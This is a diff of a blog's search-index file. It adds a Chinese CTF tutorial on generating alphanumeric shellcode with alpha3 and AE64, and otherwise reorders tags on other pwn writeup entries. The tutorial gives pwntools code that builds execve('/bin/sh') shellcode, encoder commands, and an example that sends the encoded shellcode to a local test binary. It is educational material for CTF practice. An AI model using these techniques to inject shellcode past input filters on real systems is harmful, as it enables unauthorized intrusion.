@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>纯字符shellcode生成指南</title>
+      <link href="/2020/03/31/alpha-shellcode-gen/"/>
+      <url>/2020/03/31/alpha-shellcode-gen/</url>
+      
+        <content type="html"><![CDATA[<h1 id="alphanumeric-shellcode"><a href="#alphanumeric-shellcode" class="headerlink" title="alphanumeric shellcode"></a>alphanumeric shellcode</h1><p><em>alphanumeric shellcode</em>(纯字符shellcode)是比较实用的一项技术，因为有些时候程序会对用户输入的字符进行限制，比如只允许输入可见字符，这时就需要用到纯字符的shellcode了。</p><p>原理很简单，就是使用<strong>纯字符</strong>对应的<strong>汇编指令</strong>完成shellcode的编写，比如：</p><table><thead><tr><th>ASCII字符</th><th>Hex</th><th>汇编指令</th></tr></thead><tbody><tr><td>P</td><td>0x50</td><td>push %rax</td></tr><tr><td>Q</td><td>0x51</td><td>push %rcx</td></tr><tr><td>R</td><td>0x52</td><td>push %rdx</td></tr><tr><td>S</td><td>0x53</td><td>push %rbx</td></tr><tr><td>T</td><td>0x54</td><td>push %rsp</td></tr><tr><td>U</td><td>0x55</td><td>push %rbp</td></tr><tr><td>V</td><td>0x56</td><td>push %rsi</td></tr><tr><td>W</td><td>0x57</td><td>push %rdi</td></tr><tr><td>X</td><td>0x58</td><td>pop %rax</td></tr><tr><td>Y</td><td>0x59</td><td>pop %rcx</td></tr><tr><td>Z</td><td>0x5a</td><td>pop %rdx</td></tr></tbody></table><p>其余的就不一一列出了，本篇主要介绍<strong>使用工具编码</strong>，手动编码可以参考以下几篇文章：</p><ul><li><p><a href="https://nets.ec/Alphanumeric_shellcode" target="_blank" rel="noopener">Alphanumeric shellcode</a> </p></li><li><p><a href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes" target="_blank" rel="noopener">x86纯字符编码表</a> </p></li><li><p><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes" target="_blank" rel="noopener">x64纯字符编码表</a></p></li></ul><h2 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h2><p>这个工具源码在<a href="code.google.com/p/alpha3">google</a>上，国内可以选择从<a href="https://github.com/SkyLined/alpha3.git" target="_blank" rel="noopener">github</a>下载。不过官方代码在Linux环境下运行时有些问题：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">% python ALPHA3.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"ALPHA3.py"</span>, line 4, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import charsets, encode, io</span><br><span class="line">  File <span class="string">"/home/taqini/ctf_tools/alpha3/encode.py"</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import ALPHA3</span><br><span class="line">  File <span class="string">"/home/taqini/ctf_tools/alpha3/ALPHA3.py"</span>, line 5, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import x86, x64, <span class="built_in">test</span></span><br><span class="line">  File <span class="string">"/home/taqini/ctf_tools/alpha3/test/__init__.py"</span>, line 25, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    raise OSError(<span class="string">"Unsupported platform for testing."</span>);</span><br><span class="line">OSError: Unsupported platform <span class="keyword">for</span> testing.</span><br></pre></td></tr></table></figure></div><p>看下报错信息，发现错误在<code>test/__init__.py</code>中，打开源码，发现有个<strong>判断平台</strong>的代码，如果不是<code>win32</code>就报错，解决方法很简单，只需要把后两行代码注释掉就行，修改如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sys.platform == <span class="string">'win32'</span>):</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    TEST_SHELLCODE_OUTPUT = <span class="string">"Hello, world!\r\n"</span></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#  raise OSError("Unsupported platform for testing.");</span></span><br></pre></td></tr></table></figure></div><p>再次运行就正常：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">% python ALPHA3.py</span><br><span class="line">____________________________________________________________________________</span><br><span class="line">      ,sSSs,,s,  ,sSSSs,    ALPHA3 - Alphanumeric shellcode encoder.</span><br><span class="line">     dS<span class="string">"  Y<span class="variable">$P</span>"</span>  YS<span class="string">"  ,SY    Version 1.0 alpha</span></span><br><span class="line"><span class="string">    iS'   dY       ssS"</span>     Copyright (C) 2003-2009 by SkyLined.</span><br><span class="line">    YS,  dSb   SP,  ;SP     &lt;berendjanwever@gmail.com&gt;</span><br><span class="line">    `<span class="string">"YSS'"</span>S<span class="string">'  "YSSSY"      http://skypher.com/wiki/index.php/ALPHA3</span></span><br><span class="line"><span class="string">____________________________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Usage]</span></span><br><span class="line"><span class="string">  ALPHA3.py  [ encoder settings | I/O settings | flags ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ...</span></span><br></pre></td></tr></table></figure></div><blockquote><p>修改完之后还需要编译源码，但是编译源码的工具也在google上，如果懒得自己编译，可以直接下载我修改版: <a href="https://github.com/TaQini/alpha3" target="_blank" rel="noopener">https://github.com/TaQini/alpha3</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br></pre></td></tr></table></figure></div><p>将上述代码保存成<code>sc.py</code>放到<code>alpha3</code>目录下，然后执行如下命令生成待编码的<code>shellcode</code>文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sc.py &gt; shellcode</span><br></pre></td></tr></table></figure></div><blockquote><p>默认生成的是x64的<code>sys_execve(&quot;/bin/sh&quot;,0,0)</code>，可以修改成其他的arch或shellcode</p></blockquote><h3 id="x64-alpha编码"><a href="#x64-alpha编码" class="headerlink" title="x64 alpha编码"></a>x64 alpha编码</h3><p>生成x64 alpha shellcode</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode"</span><br></pre></td></tr></table></figure></div><p>或者用我写的脚本：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shellcode_x64.sh rax</span><br></pre></td></tr></table></figure></div><blockquote><p>其中输入文件为<code>shellcode</code>，<code>rax</code>是用于编码的寄存器(shellcode基址)</p></blockquote><p>比如有如下代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00101246 48 8d     LEA    RAX,[RBP + -0x410]</span><br><span class="line">         85 f0 </span><br><span class="line">         fb ff </span><br><span class="line">0010124d ff d0     CALL   RAX</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure></div><p>通过<code>call rax</code>跳转到<code>shellcode</code>，那么<code>alpha3</code>命令中用于编码的寄存器就是<code>rax</code></p><blockquote><p><code>shellcode</code>的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个</p></blockquote><h3 id="x86-alpha编码"><a href="#x86-alpha编码" class="headerlink" title="x86 alpha编码"></a>x86 alpha编码</h3><p><code>alpha3</code>中x64的<code>shellcode</code>只要上述<code>mixedcase</code>一种情况，x86的选项比较多：</p><ul><li>x86 ascii uppercase (数字+大写字母)</li><li>x86 ascii lowercase (数字+小写字母)</li><li>x86 ascii mixedcase (数字+大小写字母)</li></ul><p>用法与x64相似，不赘述啦~</p><h3 id="全部编码方式"><a href="#全部编码方式" class="headerlink" title="全部编码方式"></a>全部编码方式</h3><p>alpha3支持的所有编码方式如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Valid base address examples <span class="keyword">for</span> each encoder, ordered by encoder settings,</span><br><span class="line">are:</span><br><span class="line"></span><br><span class="line">[x64 ascii mixedcase]</span><br><span class="line">  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI</span><br><span class="line"></span><br><span class="line">[x86 ascii lowercase]</span><br><span class="line">  AscLow 0x30 (rm32)        ECX EDX EBX</span><br><span class="line"></span><br><span class="line">[x86 ascii mixedcase]</span><br><span class="line">  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]</span><br><span class="line">                            ECX+2 ESI+4 ESI+8</span><br><span class="line">  AscMix 0x30 (i32)         (address)</span><br><span class="line">  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty</span><br><span class="line">                            countslide:EBX+offset~uncertainty</span><br><span class="line">                            countslide:ECX+offset~uncertainty</span><br><span class="line">                            countslide:EDX+offset~uncertainty</span><br><span class="line">                            countslide:ESI+offset~uncertainty</span><br><span class="line">                            countslide:EDI+offset~uncertainty</span><br><span class="line">  AscMix Countslide (i32)   countslide:address~uncertainty</span><br><span class="line">  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3</span><br><span class="line"></span><br><span class="line">[x86 ascii uppercase]</span><br><span class="line">  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br><span class="line"></span><br><span class="line">[x86 latin-1 mixedcase]</span><br><span class="line">  Latin1Mix CALL GetPC      call</span><br><span class="line"></span><br><span class="line">[x86 utf-16 uppercase]</span><br><span class="line">  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br></pre></td></tr></table></figure></div><h2 id="AE64"><a href="#AE64" class="headerlink" title="AE64"></a>AE64</h2><p><a href="https://github.com/veritas501/ae64" target="_blank" rel="noopener">AE64</a>是杭电的一位大师傅写的工具，专用于生成64位的aplha shellcode。下载方式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/veritas501/ae64.git</span><br></pre></td></tr></table></figure></div><p>AE64的优势在于编码时可以更加灵活地使用寄存器，但是生成的alpha shellcode比alpha3要更长一些。</p><p>此外AE64是python写的，可以直接在python中调用，以下是官方的栗子：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./example1'</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">'r13'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn总结 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WUST-CTF2020-Writeup~</title>
       <link href="/2020/03/30/WUST-CTF2020-pwn-wp/"/>
       <url>/2020/03/30/WUST-CTF2020-pwn-wp/</url>
@@ -20,9 +45,9 @@
       
         <tags>
             
-            <tag> CTF </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> CTF </tag>
             
             <tag> bof </tag>
             
@@ -337,13 +362,13 @@
       
         <tags>
             
-            <tag> pwn </tag>
-            
             <tag> uaf </tag>
             
             <tag> double free </tag>
             
             <tag> fastbin attack </tag>
+            
+            <tag> pwn </tag>
             
             <tag> glibc heap </tag>
             
@@ -502,11 +527,11 @@
       
         <tags>
             
+            <tag> pwn </tag>
+            
             <tag> CTF </tag>
             
             <tag> CTFd </tag>
-            
-            <tag> pwn </tag>
             
         </tags>
       
@@ -614,11 +639,13 @@
       
         <tags>
             
-            <tag> CTF </tag>
+            <tag> shellcode </tag>
             
             <tag> pwn </tag>
             
             <tag> writeup </tag>
+            
+            <tag> CTF </tag>
             
             <tag> ROP </tag>
             
@@ -629,8 +656,6 @@
             <tag> fsb </tag>
             
             <tag> crypto </tag>
-            
-            <tag> shellcode </tag>
             
             <tag> 栈迁移 </tag>
             
@@ -744,13 +769,13 @@
       
         <tags>
             
+            <tag> shellcode </tag>
+            
             <tag> double free </tag>
             
             <tag> ROP </tag>
             
             <tag> unsorted bin leak </tag>
-            
-            <tag> shellcode </tag>
             
             <tag> 栈迁移 </tag>
             
